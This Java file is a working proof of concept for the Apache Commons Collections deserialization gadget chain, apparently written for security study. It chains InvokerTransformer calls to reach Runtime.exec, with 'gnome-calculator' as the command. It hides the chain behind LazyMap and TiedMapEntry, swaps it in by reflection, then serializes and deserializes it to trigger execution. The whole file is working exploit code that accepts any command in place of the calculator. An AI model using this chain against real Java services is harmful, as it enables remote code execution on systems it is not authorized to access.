package com.sec.cwm.base.serialize;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class highJDK8ChainTrans {
    public static void main(String args[]) throws NoSuchFieldException, IllegalAccessException {
        String cmd = "gnome-calculator";
        Transformer[] fakeTransformers = new Transformer[] {new
                ConstantTransformer(1)};
        Transformer[] transformerChain=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
        };
        Transformer transformedChain = new ChainedTransformer(fakeTransformers);
//        Transformer initChain=new ChainedTransformer(fakeTransformers);
        // 创建Map对象
        Map innnermap = new HashMap();

        // 使用LazyMap创建一个含有恶意调用链的Transformer类的Map对象
        Map outerMap = LazyMap.decorate(innnermap,transformedChain);
        //使用tiedmapentry进行
        TiedMapEntry tme=new TiedMapEntry(outerMap,"114514");
        Map triggerMap=new HashMap();
        triggerMap.put(tme,"114514");
        outerMap.remove("114514");
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformedChain, transformerChain);
        try{
            ByteArrayOutputStream baos=new ByteArrayOutputStream();
            ObjectOutputStream oos=new ObjectOutputStream(baos);
            oos.writeObject(triggerMap);
            oos.close();
            System.out.println(baos);
            System.out.println(Arrays.toString(baos.toByteArray()));
            ObjectInputStream ois=new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
            ois.readObject();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
